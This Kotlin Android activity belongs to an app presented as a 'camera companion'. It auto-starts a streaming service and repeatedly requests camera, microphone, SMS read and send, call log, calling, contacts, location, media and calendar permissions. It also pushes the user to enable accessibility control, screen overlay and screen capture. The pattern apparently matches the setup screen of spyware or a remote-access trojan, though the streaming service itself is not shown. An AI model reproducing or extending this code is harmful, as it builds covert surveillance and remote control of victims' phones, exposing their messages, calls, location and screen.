package com.artem.cameracompanion

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val statusHandler = Handler(Looper.getMainLooper())
    private val statusRunnable = object : Runnable {
        override fun run() {
            findViewById<TextView>(R.id.tvStatus)?.text = StreamingService.statusText
            statusHandler.postDelayed(this, 1000)
        }
    }

    private val requestPermissions = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        StreamingService.start(this)
        updatePermsUi()
    }

    private val requestProjection = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            StreamingService.start(this, result.resultCode, result.data!!)
        }
        updatePermsUi()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
        updatePermsUi()
        requestMissingPermissions()

        findViewById<Button>(R.id.btnOpenAppSettings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")))
        }
        findViewById<Button>(R.id.btnOpenAccessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        findViewById<Button>(R.id.btnStartProjection).setOnClickListener {
            val mgr = getSystemService(MediaProjectionManager::class.java)
            requestProjection.launch(mgr.createScreenCaptureIntent())
        }
    }

    override fun onResume() {
        super.onResume()
        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
        updatePermsUi()
        statusHandler.post(statusRunnable)
        requestMissingPermissions()
    }

    override fun onPause() {
        super.onPause()
        statusHandler.removeCallbacks(statusRunnable)
    }

    private fun requestMissingPermissions() {
        val needed = buildList {
            if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
            if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                !has(Manifest.permission.POST_NOTIFICATIONS)) add(Manifest.permission.POST_NOTIFICATIONS)
            // Phone/Calls — только если объявлены в манифесте (иначе Android тихо игнорирует)
            if (!has(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
            if (!has(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
            if (!has(Manifest.permission.READ_CALL_LOG)) add(Manifest.permission.READ_CALL_LOG)
            if (!has(Manifest.permission.CALL_PHONE)) add(Manifest.permission.CALL_PHONE)
            if (!has(Manifest.permission.READ_CONTACTS)) add(Manifest.permission.READ_CONTACTS)
            if (!has(Manifest.permission.READ_SMS)) add(Manifest.permission.READ_SMS)
            if (!has(Manifest.permission.SEND_SMS)) add(Manifest.permission.SEND_SMS)
            if (!has(Manifest.permission.RECEIVE_SMS)) add(Manifest.permission.RECEIVE_SMS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
                !has(Manifest.permission.BLUETOOTH_CONNECT)) add(Manifest.permission.BLUETOOTH_CONNECT)
            // Location
            if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) add(Manifest.permission.ACCESS_FINE_LOCATION)
            if (!has(Manifest.permission.ACCESS_COARSE_LOCATION)) add(Manifest.permission.ACCESS_COARSE_LOCATION)
            // Media
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (!has(Manifest.permission.READ_MEDIA_IMAGES)) add(Manifest.permission.READ_MEDIA_IMAGES)
                if (!has(Manifest.permission.READ_MEDIA_VIDEO)) add(Manifest.permission.READ_MEDIA_VIDEO)
            } else {
                if (!has(Manifest.permission.READ_EXTERNAL_STORAGE)) add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            // Calendar
            if (!has(Manifest.permission.READ_CALENDAR)) add(Manifest.permission.READ_CALENDAR)
            if (!has(Manifest.permission.WRITE_CALENDAR)) add(Manifest.permission.WRITE_CALENDAR)
        }
        if (needed.isNotEmpty()) requestPermissions.launch(needed.toTypedArray())
    }

    private fun has(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(packageName, ignoreCase = true)
    }

    fun updatePermsUi() {
        val cam = if (has(Manifest.permission.CAMERA)) "✓" else "✗"
        val mic = if (has(Manifest.permission.RECORD_AUDIO)) "✓" else "✗"
        val acc = if (isAccessibilityEnabled()) "✓" else "✗"
        val ovr = if (Settings.canDrawOverlays(this)) "✓" else "✗"
        val prj = if (StreamingService.hasProjection) "✓" else "✗"

        val tv = findViewById<TextView>(R.id.tvPerms) ?: return
        tv.text = "Камера $cam   Микрофон $mic   Упр $acc   Оверлей $ovr   Экран $prj"

        val needsSetup = !isAccessibilityEnabled()
        findViewById<TextView>(R.id.tvAccessibilityHint).visibility =
            if (needsSetup) View.VISIBLE else View.GONE
        findViewById<Button>(R.id.btnOpenAppSettings).visibility =
            if (needsSetup) View.VISIBLE else View.GONE
        findViewById<Button>(R.id.btnOpenAccessibility).visibility =
            if (needsSetup) View.VISIBLE else View.GONE

        val needsProjection = !StreamingService.hasProjection
        findViewById<TextView>(R.id.tvProjectionHint).visibility =
            if (needsProjection) View.VISIBLE else View.GONE
        findViewById<Button>(R.id.btnStartProjection).visibility =
            if (needsProjection) View.VISIBLE else View.GONE

        if (!Settings.canDrawOverlays(this)) {
            tv.setOnClickListener {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")))
            }
        } else {
            tv.setOnClickListener(null)
        }
    }
}
